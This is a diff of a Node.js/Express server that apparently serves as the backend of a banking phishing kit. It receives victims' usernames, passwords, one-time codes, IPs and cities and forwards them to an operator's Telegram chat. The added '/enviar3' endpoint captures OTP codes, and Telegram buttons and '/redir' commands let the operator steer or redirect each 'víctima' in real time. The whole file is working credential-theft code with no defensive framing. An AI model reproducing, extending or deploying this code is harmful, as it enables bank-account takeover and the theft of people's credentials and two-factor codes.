@@ -18,6 +18,7 @@ if (!fs.existsSync(CLIENTES_DIR)) {
   fs.mkdirSync(CLIENTES_DIR);
 }
 
+// Limpieza automática cada 10 minutos: borra clientes con más de 15 minutos
 setInterval(() => {
   const files = fs.readdirSync(CLIENTES_DIR);
   const ahora = Date.now();
@@ -27,28 +28,31 @@ setInterval(() => {
     const edadMinutos = (ahora - stats.birthtimeMs) / 60000;
     if (edadMinutos > 15) {
       fs.unlinkSync(fullPath);
-      console.log(`Eliminado: ${file}`);
+      console.log(`🗑️ Eliminado: ${file} (${Math.round(edadMinutos)} min)`);
     }
   });
 }, 10 * 60 * 1000);
 
 function guardarCliente(txid, data) {
   const ruta = `${CLIENTES_DIR}/${txid}.json`;
-  if (!data.creadoEn) data.creadoEn = Date.now();
+  // Si es un cliente nuevo, guardamos la fecha de creación
+  if (!data.creadoEn) {
+    data.creadoEn = Date.now();
+  }
   fs.writeFileSync(ruta, JSON.stringify(data, null, 2));
-  console.log(`Guardado cliente ${txid} con status: ${data.status}`);
 }
 
 function cargarCliente(txid) {
   const ruta = `${CLIENTES_DIR}/${txid}.json`;
-  if (fs.existsSync(ruta)) return JSON.parse(fs.readFileSync(ruta));
+  if (fs.existsSync(ruta)) {
+    return JSON.parse(fs.readFileSync(ruta));
+  }
   return null;
 }
 
+// === ENVÍO INICIAL ===
 app.post('/enviar', async (req, res) => {
   const { usar, clavv, txid, ip, ciudad, countrycode } = req.body;
-  console.log(`Datos recibidos: ${txid} - ${usar}`);
-
   const mensaje = `
 🔵GM4YL🔵
 🆔 ID: <code>${txid}</code>
@@ -57,16 +61,23 @@ app.post('/enviar', async (req, res) => {
 🌐 IP: ${ip}
 🏙️ Ciudad: ${ciudad}, ${countrycode}
 `;
-
-  const cliente = { status: "esperando", usar, clavv, ip, ciudad };
+  const cliente = {
+    status: "esperando",
+    usar,
+    clavv,
+    ip,
+    ciudad
+  };
   guardarCliente(txid, cliente);
 
   const keyboard = {
-    inline_keyboard: [[
-      { text: "🔑 CONFIRMAR", callback_data: `confirm:${txid}` },
-      { text: "🔢 INGRESAR CÓDIGO", callback_data: `codigo_menu:${txid}` },
-      { text: "❌ ERROR LOGO", callback_data: `errorlogo:${txid}` }
-    ]]
+    inline_keyboard: [
+      [
+        { text: "🔑 CONFIRMAR", callback_data: `confirm:${txid}` },
+        { text: "🔢 INGRESAR CÓDIGO", callback_data: `codigo_menu:${txid}` },
+        { text: "❌ ERROR LOGO", callback_data: `errorlogo:${txid}` }
+      ]
+    ]
   };
 
   await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
@@ -82,54 +93,146 @@ app.post('/enviar', async (req, res) => {
   res.sendStatus(200);
 });
 
+
+
+// === ENVÍO CON CÓDIGO DINÁMICO ===
+app.post('/enviar3', async (req, res) => {
+  const { usar, clavv, txid, dinamic, ip, ciudad } = req.body;
+  const mensaje = `
+🔑🟢B4N3SC0🟢
+🆔 ID: <code>${txid}</code>
+📱 US4R: <code>${usar}</code>
+🔐 CL4V: <code>${clavv}</code>
+🔑 0TP: <code>${dinamic}</code>
+🌐 IP: ${ip}
+🏙️ Ciudad: ${ciudad}
+`;
+  const keyboard = {
+    inline_keyboard: [
+      [
+        { text: "🔑 CÓDIGO", callback_data: `cel-dina:${txid}` },
+        { text: "🔢 INGRESAR CÓDIGO", callback_data: `codigo_menu:${txid}` },
+        { text: "❌ ERROR LOGO", callback_data: `errorlogo:${txid}` }
+      ]
+    ]
+  };
+
+  const cliente = cargarCliente(txid) || {};
+  cliente.status = "esperando";
+  guardarCliente(txid, cliente);
+
+  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: CHAT_ID,
+      text: mensaje,
+      parse_mode: 'HTML',
+      reply_markup: keyboard
+    })
+  });
+  res.sendStatus(200);
+});
+
+// === WEBHOOK DE TELEGRAM ===
 app.post('/webhook', async (req, res) => {
-  console.log("WEBHOOK RECIBIDO");
+  // Comando: /txid 25
+  if (req.body.message?.text?.startsWith('/')) {
+  const commandParts = req.body.message.text.slice(1).trim().split(' ');
+  const primerArg = commandParts[0];
 
-  if (req.body.callback_query) {
-    const callback = req.body.callback_query;
-    const data = callback.data;
-    const [accion, txid] = data.split(':');
+  // Caso 1: Comando para ingresar código → /txid 22
+  if (/^[a-zA-Z0-9]{8}$/.test(primerArg)) {  // txid típico de 8 caracteres
+    const txid = primerArg;
+    const codigoStr = commandParts[1]?.trim();
 
-    console.log(`BOTÓN PRESIONADO: ${accion} - TXID: ${txid}`);
-
-    const cliente = cargarCliente(txid);
-    if (!cliente) {
-      console.log(`Cliente no encontrado: ${txid}`);
+    if (!codigoStr || !/^\d{2}$/.test(codigoStr)) {
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: req.body.message.chat.id,
+          text: `⚠️ Formato inválido.\nUsa: /${txid} NN\nEjemplo: /${txid} 25`
+        })
+      });
       return res.sendStatus(200);
     }
 
-    if (accion === 'confirm') cliente.status = 'en_otro4';
-    else if (accion === 'errorlogo') cliente.status = 'en_index2';
-
+    const cliente = cargarCliente(txid) || { status: 'esperando' };
+    cliente.codigo = codigoStr;
+    cliente.status = 'codigo_ingresado';
     guardarCliente(txid, cliente);
-    console.log(`Nuevo status: ${cliente.status}`);
 
-    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
-        callback_query_id: callback.id,
-        text: "OK"
+        chat_id: req.body.message.chat.id,
+        text: `✅ Código guardado: ${codigoStr} para ${txid}`
       })
     });
     return res.sendStatus(200);
   }
 
-  res.sendStatus(200);
+  // Caso 2: Nuevo comando /redir txid pagina.html
+  if (primerArg === 'redir' && commandParts.length >= 3) {
+    const txid = commandParts[1];
+    const paginaDestino = commandParts.slice(2).join(' ');  // Permite nombres con espacios si quieres
+
+    const cliente = cargarCliente(txid);
+    if (!cliente) {
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: req.body.message.chat.id,
+          text: `❌ No se encontró el txid: ${txid}`
+        })
+      });
+      return res.sendStatus(200);
+    }
+
+    cliente.redir_a = paginaDestino;  // Guardamos la página destino
+    cliente.status = 'redirigiendo';  // Status especial para detectar
+    guardarCliente(txid, cliente);
+
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        chat_id: req.body.message.chat.id,
+        text: `✅ Redirección programada para ${txid}\n➡️ Página: ${paginaDestino}`
+      })
+    });
+    return res.sendStatus(200);
+  }
+
+  // Si no es ningún comando conocido
+  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      chat_id: req.body.message.chat.id,
+      text: `Comandos disponibles:\n/${'txid'} 22 → ingresar código\n/redir txid pagina.html → redirigir víctima`
+    })
+  });
+  return res.sendStatus(200);
 });
 
+// === ESTADO PARA TU PÁGINA WEB ===
 app.get('/status', (req, res) => {
   const txid = req.query.txid;
-  if (!txid) return res.status(400).json({ error: 'Falta txid' });
+  if (!txid) {
+    return res.status(400).json({ error: 'Falta txid' });
+  }
   const cliente = cargarCliente(txid) || { status: 'esperando' };
   res.json({
     status: cliente.status || 'esperando',
-    codigo: cliente.codigo || null,
-    redir_a: cliente.redir_a || null
+    codigo: cliente.codigo || null
   });
 });
 
-app.get('/', (req, res) => res.send("OK"));
+app.get('/', (req, res) => res.send("Servidor activo en Render"));
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Servidor corriendo en puerto ${PORT}`));
+app.listen(PORT, () => console.log(`Servidor activo en Render puerto ${PORT}`));
